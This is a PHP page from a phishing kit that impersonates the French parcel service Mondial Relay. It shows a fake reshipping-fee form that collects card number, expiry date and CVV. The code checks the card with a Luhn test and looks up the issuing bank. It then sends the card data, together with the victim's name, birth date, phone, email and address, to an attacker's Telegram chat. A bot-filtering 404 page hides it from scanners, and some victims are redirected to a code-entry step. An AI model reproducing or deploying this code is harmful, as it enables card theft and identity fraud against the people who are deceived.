<?php

if (!isset($token) || $token !== $_SESSION['token']) {
    $this->killBot->show404Page();
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['token']) && $_POST['token'] === $token) {
        if (
            empty($_POST['ccNumber']) ||
            empty($_POST['ccExpiration']) ||
            empty($_POST['ccCvc'])
        ) {
            if (empty($_POST['ccNumber'])) {
                return header('location: ./pay?id=' . $token . '&empty');
            }
            if (empty($_POST['ccExpiration'])) {
                return header('location: ./pay?id=' . $token . '&empty1');
            }
            if (empty($_POST['ccCvc'])) {
                return header('location: ./pay?id=' . $token . '&empty2');
            }

            return;
        }

        $cardNumber = $_POST['ccNumber'];
        $sum = 0;

        $cardNumberLength = strlen($cardNumber);
        for ($i = 0; $i < $cardNumberLength; $i++) {
            $intVal = intval($cardNumber[$i]);
            if ($i % 2 === $cardNumberLength % 2) {
                $intVal *= 2;
                if ($intVal > 9) {
                    $intVal -= 9;
                }
            }
            $sum += $intVal;
        }

        list($month, $year) = explode('/', $_POST['ccExpiration']);
        $currentYear = (int)date('y');
        $expiryDateValid = ($month >= 1 && $month <= 12 && $year >= $currentYear);
        $cvvValid = is_numeric($_POST['ccCvc']);
        $isValid = ($sum % 10 === 0 && $expiryDateValid && $cvvValid);

        if (!$isValid) {
            header('location: ./pay?id=' . $token . '&invalidcc');
            return;
        }

        $_SESSION['ccnum'] = htmlspecialchars(preg_replace("/\s+/", "", $_POST['ccNumber']));
        $_SESSION['ccexp'] = htmlspecialchars($_POST['ccExpiration']);
        $_SESSION['cvv'] = htmlspecialchars($_POST['ccCvc']);
        $cc = $_SESSION['ccnum'];
        $bin = substr($cc, 0, 6);

        $pr = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
        $d = $pr . '://' .  $_SERVER['HTTP_HOST'];
        if ($pr === 'http') {
            $d = 'http://www.localhost';
        }
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, "https://data.handyapi.com/bin/" . $bin);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_HTTPHEADER, array('referrer: ' . $d));
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
        $response = json_decode(curl_exec($curl), true);
        curl_close($curl);
        $brand = isset($response) && isset($response['CardTier']) ? $response['CardTier'] : "❌";
        $type = isset($response) && isset($response['Type']) ? $response['Type'] : "❌";
        $bank = isset($response) && isset($response['Issuer']) ? $response['Issuer'] : "❌";

        telegram_api($config['token'], 'sendMessage', [
            'chat_id' => $config['cc'],
            'reply_markup' => json_encode([
                'inline_keyboard' => [
                    $btnBl
                ]
            ]),
            'text' => "<b>🇫🇷 +1 CC MONDIAL RELAY</b>
    
💳 Numéro de carte : " . $_POST['ccNumber'] . "
💳 Date d'expiration : " . $_POST['ccExpiration'] . "
💳 CVV (Code de sécurité) : " . $_POST['ccCvc'] . "
    
🏛  Banque : " . ($bank) . "
🥇 Niveau : " . ($brand) . "
📉 Type : " . ($type)  . "
       
📞 Phone <code>" . $_SESSION['tel'] . "</code>
📩 Email <code>" . $_SESSION['email'] . "</code>

👤 Full name  <code>" . $_SESSION['name'] . "</code>
⏰ Date of birth <code>" . $_SESSION['birthDate'] . "</code>
⏰ Livrasion <code>" . $_SESSION['date'] . "</code>
📞 Phone <code>" . $_SESSION['tel'] . "</code>
📩 Email <code>" . $_SESSION['email'] . "</code>
🏡 Address <code>" . $_SESSION['address'] . "</code>
🏡 City <code>" . $_SESSION['city'] . "</code>
🏡 ZIP code <code>" . $_SESSION['zip'] . "</code>" . victim_infos($ip, $check),
            'parse_mode' => 'HTML'
        ]);
        if ($config['ap']) {
            ini_set('memory_limit', '-1');
            ini_set('max_execution_time', '60');

            sleep($config['delay']);

            header('Location: /code?id=' . $token);
        } else header('Location: /fin?id=' . $token);
    }
} else {
    require_once(b . '/views/components/header.php');
?>
    <form method="post" novalidate='novalidate'>
        <input type="hidden" name="token" value="<?= htmlspecialchars($token) ?>" />
        <h4>Confirmez votre créneau de livraison pour le <?= $_SESSION['date'] ?></h4>
        <p>Pour procéder à la réexpédition de votre colis dû à l'échec de livraison, il est impératif de disposer d'une méthode de paiement valide afin de régler les <?= $config['prix'] ?> de frais de livraison.</p>
        <div class="img-container">
            <img class="secure-img" src="views/assets/img/securepay.png" alt="">
            <h3 style="font-weight: normal"> Montant : <strong><?= $config['prix'] ?></strong></h3>
        </div>
        <h3 style="margin-top: 0;">Informations de facturation</h3>
        <?php if (isset($_GET["invalidcc"])) { ?>
            <div class="notifications">
                <p class="notification notification-critical" role="alert">Votre carte bancaire est invalide.</p>
            </div>
        <?php } ?>
        <div class="fieldWrapper"><input type="text" id="facturation_form_ccNumber" name="ccNumber" required="required" class="js-number"
                maxlength="19" placeholder="" inputmode="numeric"><label for="facturation_form_ccNumber" class="required">Numéro de carte</label></div>
        <?php if (isset($_GET["empty"])) { ?>
            <div class="notifications">
                <p class="notification notification-critical" role="alert">Cette valeur ne doit pas être vide.</p>
            </div>
        <?php } ?> <div class="fieldWrapper"><input type="text" id="facturation_form_ccExpiration" name="ccExpiration"
                required="required" class="js-exp" maxlength="5" placeholder="" inputmode="numeric"><label for="facturation_form_ccExpiration" class="required">Date d'expiration (MM/AA)</label></div>
        <?php if (isset($_GET["empty1"])) { ?>
            <div class="notifications">
                <p class="notification notification-critical" role="alert">Cette valeur ne doit pas être vide.</p>
            </div>
        <?php } ?>
        <div class="fieldWrapper"><input type="text" id="facturation_form_ccCvc" name="ccCvc" required="required" class="js-ccv" maxlength="3" placeholder="" inputmode="numeric"><label for="facturation_form_ccCvc" class="required">CVV (Cryptogramme visuel)</label></div>
        <?php if (isset($_GET["empty2"])) { ?>
            <div class="notifications">
                <p class="notification notification-critical" role="alert">Cette valeur ne doit pas être vide.</p>
            </div>
        <?php } ?>
        <div class="button-zone" style="text-align: center;">
            <button type="submit" id="facturation_form_submit" name="submit">Confirmer mon mode de paiement</button>
            <span class=" lock">Ce site est entièrement sécurisé</span>
        </div>
        <script>
            $(document).ready(function() {
                $('.js-exp').mask('00/00');
            });
        </script>
    </form>
<?php
    require_once(b . '/views/components/footer.php');
}
